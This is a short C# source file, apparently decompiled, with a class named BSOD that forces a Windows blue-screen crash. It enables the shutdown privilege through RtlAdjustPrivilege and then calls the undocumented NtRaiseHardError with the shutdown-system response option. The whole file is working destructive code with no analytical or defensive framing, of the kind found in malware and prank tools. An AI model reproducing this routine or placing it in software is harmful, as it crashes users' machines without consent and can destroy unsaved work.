using System;
using System.Runtime.InteropServices;

namespace YYY;

internal class BSOD
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);

	[DllImport("ntdll.dll")]
	private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

	public static bool RaisePrivilege()
	{
		bool Enabled;
		return RtlAdjustPrivilege(19, Enable: true, CurrentThread: false, out Enabled) == 0;
	}

	public static bool CauseNtHardError()
	{
		uint Response;
		uint num = NtRaiseHardError(-1073741790, 0u, 0u, IntPtr.Zero, 6u, out Response);
		return num == 0;
	}
}
